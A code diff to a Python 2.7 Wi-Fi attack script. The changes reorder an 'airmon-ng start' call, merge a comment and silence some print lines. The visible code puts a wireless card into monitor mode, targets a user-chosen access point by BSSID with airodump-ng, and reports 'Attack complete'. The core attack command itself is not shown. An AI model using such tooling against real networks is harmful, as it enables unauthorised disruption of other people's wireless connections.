@@ -1,5 +1,4 @@
-# Python 2.7 compatible, Linux only, ensure wireless interface is
-# is both capable of packet injection and is assigned to wlan0
+# Python 2.7 compatible, Linux compatible, ensure wireless interface is both capable of packet injection and is assigned to wlan0
 
 import os
 import sys
@@ -12,13 +11,15 @@ def startup():
     print("")
     print("Ensure the network interface is not in monitor mode. ")
     choice = raw_input("Continue? Y/N: ")
-    os.system("xterm -e airmon-ng start wlan0")
 
     while choice.lower() != "y" and choice.lower() != "n":
         print("Invalid input. ")
         choice = raw_input("Continue? Y/N: ")
     if choice.lower() == "n":
         sys.exit()
+
+    os.system("xterm -e airmon-ng start wlan0")
+
 
 def main():
     table = {}
@@ -49,11 +50,11 @@ def main():
         print("Invalid response. ")
         target = raw_input("Please select again. ")
     print("")
+   
     timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
-
     if timer == "-1":
         print("")
-        print("Initializing...\n")
+        #print("Initializing...\n")
         print("Targeting "+ target + " at address " + table[target])
         print("Press ctlr+c to quit. ")
         os.system(arg1)
@@ -70,7 +71,7 @@ def main():
                 timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
         timer = str(timer)
         print("")
-        print("Initializing...\n")
+        #print("Initializing...\n")
         print("Targeting " + target+ " at address " + table[target] + " for "+str(timer) + " seconds. ")
         os.system("xterm -e timeout 5 airodump-ng -d " + BSSID + " -c 11 wlan0mon")
         time.sleep(1)
@@ -78,6 +79,6 @@ def main():
         os.system("xterm -e airmon-ng stop wlan0mon")
         time.sleep(1)
         print("Attack complete. \n")
-        
+
 startup()
 main()
